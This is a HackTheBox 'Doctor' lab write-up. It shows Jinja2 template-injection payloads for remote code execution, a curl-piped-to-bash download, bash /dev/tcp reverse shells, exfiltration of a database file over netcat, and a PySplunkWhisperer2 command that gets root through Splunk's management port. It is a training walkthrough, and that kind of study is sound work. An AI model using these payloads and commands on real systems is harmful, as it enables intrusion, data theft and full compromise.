## Reconnaissance

### nmap 

![](./IMG/0.png)

> Open Service:
1. Port 22: SSH
2. Port 80: HTTP
3. Port 8089: Splunk httpd

### Web Service 
![](./IMG/1.png)
> I can find the domain of this service 
```
doctors.htb
```
> Set it in /etc/hosts

![](./IMG/2.png)

> At the same time, check the home page request in Burp 

![](./IMG/6.png)

> After add the domain in /etc/hosts
> Access the web service again, it will redirect to login page 

![](./IMG/5.png)

> Observe the request in Burp 

![](./IMG/7.png)

> Compare these 2 home page request, I found that the service is based on different web framework
1. Before add domain, it runs on apache 2.4.41
2. After add domain, it runs on python 3.8.2 and Werkzeug 1.0.1

> In the request, I find the session value

![](./IMG/8.png)

> After decoded it, the value include a message
```
Please log in to access this page
```
![](./IMG/9.png)

### Gobuster 

 > Gobuster scan before correspond to domain  
```
gobuster dir -u http://10.129.2.21 -w /usr/share/wordlists/dirb/common.txt -o doctor.out
```
![](./IMG/10.png)

> Gobuster scan after  correspond to domain  
```
gobuster dir -u http://doctors.htb -w /usr/share/wordlists/dirb/common.txt -o doctors.out
```
![](./IMG/68.png)
### Enumerate web service 

> Since I don't have any credential to login, so I try the common credential like

 - admin /admin 
- admin / Welcome
- admin / r00t
- admin / Password

![](./IMG/11.png)

> All of them are failed, but here is another function "Sign up Now"
> I created a user through this function 

```
test / test@admin.htb / test
```

![](./IMG/12.png)

> After creating, it shows the following message
```
Your account has been created, with a time limit of twenty minutes!
```

![](./IMG/13.png)

![](./IMG/14.png)

> Then login by this new credential

![](./IMG/15.png)

![](./IMG/16.png)

![](./IMG/17.png)

> Go through the function, Try the "New Message" function 

![](./IMG/18.png)

![](./IMG/69.png)

>  I tried to create a test message like below image
> The URL will looks like `/user/test` when click the user link to check the POST from specific user

![](./IMG/20.png)

![](./IMG/19.png)

> It seems can leverage to check other user's POST by modified the last path.
> I do the following test 
```
/user/test -> /user/admin
```
> I can see the POST from user admin .

![](./IMG/21.png)

> But I only can check other user's POST, and I don't have more information about other users from this loophole.
> Besides that, it's not easy to know the other user's name or the critical user's name.

> So next part I change to follow the gobuster result.
> There is a interesting path /archive which I also can find in source code view.
> It was a link which comment out ... 
> yap, most of the time, the comment out code usually have something interesting in it.
> So I start to enumerate it.

![](./IMG/22.png)

> After accessing /archive, the browser just show a blank page.
> But if check the source code, it can find some information

![](./IMG/23.png)

> Confirm the request in Burp, the response shows the following
```
<channel>
<title>Archive</title>
<item>
<title>test</title>
</item>
</channel>
```
> It's easy to know the POST title will be store in here.

![](./IMG/24.png)

> Since I can controll the input and can check the output in /archive page
> So I start to test what kind of attack can shows in this page.
1. XXE  -> Failed
2. SQL injection -> Failed
3. XSS 
4. command injection (some writeup also show this will work.)
5. SSTI -> Success
> SSTI will works in here with this payload

```
{{ 7*7 }}
```

![](./IMG/25.png)

![](./IMG/26.png)

> According to the following flow, I can confirm the template code based on Jinja2 or Twig


![](./IMG/27.png)
> With previous information and following picture, I know the web service is based on Python.

![](./IMG/28.png)

### Enumerate Splunk 
- Also browse to Splunk service

![](./IMG/3.png)
- I confirm the version of Splunk is 8.0.5

![](./IMG/4.png)

- Try to check the services, but it will ask credential which I don't get it now.
- So the page will direct to Unauthorized error page. (Forgot to make screenshot)
## Exploit 

> So I start to find other payload which can cause RCE 
1. [SSTI (Server Side Template Injection)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
2. [Jinja2 SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti)
3. [(PayloadsAllTheThings)Server Side Template Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)

> Here are the payload test for Twig, it can prove this template code is not based on Twig
```
{{ self }}
```

![](./IMG/29.png)

![](./IMG/30.png)

> Then tried the following payload which should work for jinja2

```
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

![](./IMG/31.png)

> Then confirm the result in /archive.
> It works, I got the current user's id information .

![](./IMG/32.png)

> Now, I have to try the following payload to create a reverse shell
> Before I start to do it, I have to prepare the following
1. Create a Simple HTTP Server to transfer reverse shell file
```
python -m http.server 9797
```
2. Create a shell file
```
#!/bin/bash

bash -i >& /dev/tcp/10.10.17.145/1337 0>&1
```
3. Create a nc listener
```
nc -nlvp 1337
```
> As long as the previous step finish, I put the following payload in message title.
```
{{ cycler.__init__.__globals__.os.popen('curl 10.10.17.145:9797/shell.sh | bash').read() }}
```

![](./IMG/33.png)

> Then, It's easy to find the shell.sh file has been downloaded from target.

![](./IMG/34.png)

> After downloading, the nc listener get reverse shell.

![](./IMG/35.png)

> Confirming the current user id information 
> It's user 'web' 
```
id
whoami
```

![](./IMG/36.png)


> Start to enumerate the target machine 
> First, I checked the /home directory
> It has 2 directory, (means it might have 2 users)
1. shaun
2. web (current)
> I tried to read user flag, but it will failed.
> So, I have to upgrade user to shaun now.

![](./IMG/39.png)
- I kept enumerate the server
```
cat /etc/passwd 
```

![](./IMG/37.png)
![](./IMG/38.png)

> Check sudo permission list 
```
sudo -l
```

![](./IMG/40.png)

> I move to /home/web directory and check the source code of blog
> I find a interesting things in config.py
> There are some configuration for DB connection, I can get the following information from these 2 files config.py and blog.sh 

1. SECRET_KEY
2. DB URI 
3. MAIL Port
4. MAIL Username
5. MAIL Password 

```
1234
sqlite://///home/web/blog/flaskblog/site.db
doctor / doctor
```

![](./IMG/41.png)

![](./IMG/44.png)

> The environment parameter also can get from the following command 
```
printeenv | less
```

![](./IMG/43.png)

> I know the dbms is sqlite, I also transfer the db file to my local to confirm the content.

- Listener on local
```
nc -nlvp 1338 > site.db
```
- nc on target machine
```
nc -w 3 10.10.17.145 1338 < site.db
```
> Using sqlite3 to confirm the content, but it only shows some user information for website.
> I think that is not the clue I want.
> The same information also can be found in linpeas result 

![](./IMG/50.png)
### linpeas 

> Yes, I also execute linpeas to enumerate the target machine 

![](./IMG/45.png)
![](./IMG/46.png)

> The current running process.

![](./IMG/47.png)
![](./IMG/48.png)

> Files related to passwd 

![](./IMG/51.png)
> Some passwd file related to splunk 

![](./IMG/49.png)
> Using grep to search the keyword 'shaun' in linpeas result.
> Nothing Special.
```
cat linpeas.txt | grep 'shaun'
```

![](./IMG/52.png)

> Find a password in logs 

```
Guitar123
```

![](./IMG/54.png)
![](./IMG/53.png)

## Privilege Escalation 

> Try this password to escalate user to shaun
```
su shaun
shaun / Guitar123
```

![](./IMG/55.png)

> I think I have changed user to shaun 
> Check the current user 
```
id 
whoami
```

![](./IMG/56.png)

> Get user flag 

![](./IMG/70.png)

> Next part, I need to escalate the privilege to root.
> Check the file which set permission to 's'
```
find / -perm -u=s 2>/dev/null
```

![](./IMG/57.png)
![](./IMG/58.png)
> Confirm the sudo permission list again, still can't get further information.

```
sudo -l
```

![](./IMG/59.png)

- Then since I have a credential for shaun.
```
shaun / Guitar123
```
> So I back to splunk http service to try to login 
> Then I can view the service now.

![](./IMG/60.png)

> With the credential for splunk, I start to research how to escalate privilege or RCE by splunk service.
> And I find the following GITHUB first.

- [SplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2)

![](./IMG/61.png)

> With the internal article link, I know the vulnerability happened on Splunk Universal Forwarder
> But for more detail, I still need some time to research it.
> And I can know the base thing that the vulnerability need valid authenticated user from README and usage of program 

- [Splunk Universal Forwarder Hijacking 2: SplunkWhisperer2](https://clement.notin.org/blog/2019/02/25/Splunk-Universal-Forwarder-Hijacking-2-SplunkWhisperer2/)

> With this HackTricks article, I know it's able to use the tool to do the RCE.
> And it also provide the following description to talk about the vulnerability happened on Splunk Universal Forwarder

> Description: 
> The Splunk Universal Forwarder Agent (UF) allows authenticated remote users to send single commands or scripts to the agents through the Splunk API. The UF agent doesn’t validate connections coming are coming from a valid Splunk Enterprise server, nor does the UF agent validate the code is signed or otherwise proven to be from the Splunk Enterprise server. This allows an attacker who gains access to the UF agent password to run arbitrary code on the server as SYSTEM or root, depending on the operating system.

- [Splunk LPE and Persistence](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/splunk-lpe-and-persistence)

![](./IMG/62.png)

> So, I use the following payload to tried to ping my host to confirm the RCE works or not.
- Launched tcpdump to listen on tun0 interface
```
tcpdump -i tun0
```
- Launched exploit script
```
python PySplunkWhisperer2_remote.py --host 10.129.2.21 --port 8089 --lport 10.10.17/145 --lport 1338 --username shaun --password Guitar123 --payload 'ping -c 3 10.10.17.145'
```

![](./IMG/63.png)

> From tcpdump message, I can know the payload script try to established the connection.
> And the ping also executed.
> So, now I try to make another reverse shell back to port 1339

```
python PySplunkWhisperer2_remote.py --host 10.129.2.21 --port 8089 --lport 10.10.17/145 --lport 1338 --username shaun --password Guitar123 --payload "bash -c 'bash -i >& /dev/tcp/10.10.17.145/1339 0>&1'"
```

![](./IMG/64.png)

> Check nc listener 
> Surprised, I get reverse shell, and the user is root.
> I think the reason is the splunk service launched by root user.

![](./IMG/65.png)

> Confirm root user 

```
id 
whoami
```

![](./IMG/66.png)

> Get root flag

![](./IMG/67.png)
## Reference 

### Writeup 

- [HTB: Doctor](https://0xdf.gitlab.io/2021/02/06/htb-doctor.html)
- [(Discussion)Doctor](https://forum.hackthebox.com/t/official-doctor-discussion/3288)
### SSTI 

1. [(HackTricks)SSTI (Server Side Template Injection)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
2. [(HackTricks)inja2 SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti)
3. [(PayloadsAllTheThings)Server Side Template Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
### Splunk 

- [(GITHUB)SplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2)
- [Splunk Universal Forwarder Hijacking 2: SplunkWhisperer2](https://clement.notin.org/blog/2019/02/25/Splunk-Universal-Forwarder-Hijacking-2-SplunkWhisperer2/)
- [(HackTricks)Splunk LPE and Persistence](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/splunk-lpe-and-persistence)
- [Splunk Universal Forwarder Hijacking](https://airman604.medium.com/splunk-universal-forwarder-hijacking-5899c3e0e6b2)
- [(HackTricks)8089 - Pentesting Splunkd](https://book.hacktricks.xyz/network-services-pentesting/8089-splunkd)

### Command Injection 

- [(HackTricks)Command Injection](https://book.hacktricks.xyz/pentesting-web/command-injection)
- [(GITHUB)Command Injection](https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/command-injection.md)
### XXE

- [(HackTricks)XXE - XEE - XML External Entity](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)

### Linux command & others 

- [Linux List All Environment Variables Command](https://www.cyberciti.biz/faq/linux-list-all-environment-variables-env-command/)
- [reverse shell](https://www.revshells.com/)
- [Using Netcat for File Transfers](https://nakkaya.com/2009/04/15/using-netcat-for-file-transfers/)
###### tags: `HackTheBox` `Splunk` `SSTI` 